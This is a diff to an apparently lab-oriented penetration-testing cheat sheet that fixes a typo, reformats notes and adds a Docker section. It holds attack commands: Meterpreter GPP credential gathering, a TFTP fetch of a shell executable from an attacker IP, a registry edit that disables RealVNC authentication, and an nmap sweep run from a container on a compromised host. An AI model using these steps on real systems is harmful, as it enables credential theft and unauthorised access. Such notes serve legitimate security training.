@@ -598,7 +598,7 @@ PE (switch admin user to NT Authority/System):
 
 `post/windows/gather/credentials/gpp` Meterpreter Search GPP
 
-[Windows Exploit Sugesster](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+[Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
 
 Compile
 `i686-w64-mingw32-gcc 646.c -lws2_32 -o 646.exe`
@@ -609,10 +609,11 @@ atftpd --daemon --port 69 `pwd`
 c=tftp -i 10.11.0.235 get shellM.exe
 ```
 
-VNC
-RealVNC4
-`meterpreter > reg setval -k HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 -v SecurityTypes -d None`
+VNC - RealVNC4
+```
+meterpreter > reg setval -k HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 -v SecurityTypes -d None
 Successfully set SecurityTypes of REG_SZ.
+```
 (Also try HKCU\Software\RealVNC\WinVNC4\SecurityTypes if above does not work)
 
 #### SMB
@@ -792,3 +793,14 @@ F8 - allow completion
 ```
 
 objdump -d file	will dump assembly
+
+# Docker
+Get path of container in host file structure:
+
+`docker_path=/proc/$(docker inspect --format {{.State.Pid}} <ContainerID>)/root`
+
+transfer docker image to host by using `root@kali:~/# docker save uzyexe/nmap -o nmap.tar` and after copying on target:
+```bash
+docker load -input nmap.tar
+docker run --network=br0 -it --rm uzyexe/nmap -sn -T4 -v 10.10.10.0/24
+```
